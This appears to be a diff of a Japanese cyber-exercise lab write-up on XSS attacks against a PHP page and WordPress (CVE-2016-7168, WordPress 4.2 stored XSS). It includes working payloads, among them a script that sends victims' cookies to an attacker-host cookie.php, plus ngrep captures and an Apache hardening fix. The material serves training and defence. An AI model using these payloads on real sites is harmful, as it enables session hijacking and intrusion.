@@ -42,15 +42,18 @@ Target OSに設置されたウェブサーバは入力された文字列を表�
 
 ### Steps
 1. ht&#8203;tp://target.cyexc-target:8000/php/xss.phpにアクセスする。
+
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/xss.png" title="Screenshot1">
 
 2. `"><script>alert(document.cookie)</script><!--`を入力する。
 クッキー情報がポップアップ表示される。
+
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/cookie1.png" title="Screenshot2">
 
 3. `"><script>window.location='http://attacker.cyexc-attacker:8081/cookie.php?c='+document.cookie;</script><!--`を入力する。
 Attacker OSのクッキー情報を窃取するPHPコード（cookie.php）が実行される。
-<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/cookie2.png" title="Screenshot3">
+
+<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/cookie2.png" width=600 title="Screenshot3">
 
 窃取した攻撃対象のウェブサイトのクッキー情報はこちら＠[index.html](https://github.com/CyExc/CyExc/blob/master/2017/ex3/logs/index.html)
 
@@ -60,11 +63,14 @@ Attackerが不正なスクリプトを攻撃に利用するXSSの脆弱性を持
 
 ### curlコマンド
 HTTPアクセスしてコンテンツを取得することができる。-Iオプションを使うと、HTTPリクエストのレスポンスヘッダを取得することができる。
+
 ```
 Usage: curl [options...] <url>
 Options: (H) means HTTP/HTTPS only, (F) means FTP only
 ```
-* 例）www.google.comのHTTPレスポンスヘッダを取得
+
+* 例） ht&#8203;tp://w&#8203;ww.google.com のHTTPレスポンスヘッダを取得
+
 ```
 vagrant@attacker:~$ curl -I http://www.google.com
 HTTP/1.1 302 Found
@@ -100,8 +106,8 @@ root@a4ff20247d20:~# service apache2 restart
 apache2vagrant@target:~/target$ sudo docker-compose exec wordpress bash
 ```
 4. /etc/apache2/conf-available/security.confに以下の設定を追加する。
-    * `Header set X-XSS-Protection "1; mode=block"`
-    * `Header edit Set-Cookie ^(.*)$ $1;HttpOnly;Secure`
+    + **Header set X-XSS-Protection "1; mode=block"**
+    + **Header edit Set-Cookie ^(.*)$ $1;HttpOnly;Secure**
 
 ```
 root@a4ff20247d20:/var/www/html# vi /etc/apache2/conf-available/security.conf
@@ -146,9 +152,12 @@ CVE-2016-7168は、XSSコードが含まれている画像ファイル名にお�
 ### Steps
 1. Browse to ht&#8203;tp://target.cyexc-target:8000
 2. ファイル名にXSSコードが含まれている画像をWordPress記事に添付する。
-<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/post.png" title="Screenshot4">
+
+<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/post.png" width=800 title="Screenshot4">
+
 3. プレビュー画面に遷移する。
-<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/CVE-2016-7168.png" title="Screenshot5">
+
+<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/CVE-2016-7168.png" width=800 title="Screenshot5">
 
 ### WordPress 4.2 Stored XSS事象
 WordPress 4.2 Stored XSSは、WordPressに投稿された記事のコメント欄にJavaScriptと64KB以上の文字列を一緒に投稿することで、コメント欄を表示したTarget OSのブラウザ上で任意のJavaScriptを実行することができる。
@@ -156,15 +165,22 @@ WordPress 4.2 Stored XSSは、WordPressに投稿された記事のコメント�
 ### Steps
 1. Browse to ht&#8203;tp://target.cyexc-target:8000
 2. WordPressに投稿された記事のコメント欄にJavaScriptと64KB以上の文字列を一緒に投稿する。
-`<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>`
-64KB以上の文字列は下記のようなPythonスクリプトで作成した。
+
+```html
+<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
 ```
+
+64KB以上の文字列は下記のようなPythonスクリプトで作成した。
+
+```python
 print 'A' * (64*1024 + 1)
 ```
-確認ではWEB ShellコードをGETするXSSコード設置した。WordPressサーバに不正なスクリプトが設置される。
-<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/4_2_XSS.png" title="Screenshot6">
 
-#### wordpressサーバでHTTP通信をキャプチャ
+確認ではWEB ShellコードをGETするXSSコード設置した。WordPressサーバに不正なスクリプトが設置される。
+
+<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/4_2_XSS.png" width=800 title="Screenshot6">
+
+#### wordpressコンテナでHTTP通信をキャプチャ
 1. wordpressコンテナにログイン
 ```
 vagrant@target:~/target/wordpress$ sudo docker-compose exec wordpress bash
@@ -188,11 +204,14 @@ vagrant@target:~/target/wordpress$ sudo docker cp 64ff6b86f93b:/var/www/html/ngr
 
 ### CVE-2016-7168の確認
 * XSSコードが含まれている画像のアップロード
+``
 T 192.168.33.1:60465 -> 192.168.1.10:80 [AP]
 GET /wp-content/uploads/2018/02/img-srca-onerroralertdocument.cookie-300x300.png HTTP/1.1
 Host: target.cyexc-target:8000.
+``
 
 * XSSコードが含まれている画像ファイル名が動的WEBページに紛れ込んでいることがわかる。
+``
 T 192.168.33.1:60475 -> 192.168.1.10:80 [A]
 POST /wp-admin/async-upload.php HTTP/1.1.
 Host: target.cyexc-target:8000.
@@ -204,6 +223,7 @@ Connection: keep-alive.
 Content-Disposition: form-data; name="name".
 .
 **<img src=a onerror=alert(document.cookie)>.png.**
+``
 
 取得したログはこちら＠[ngrep.log](https://github.com/CyExc/CyExc/blob/master/2017/ex3/logs/ngrep2.log)
 
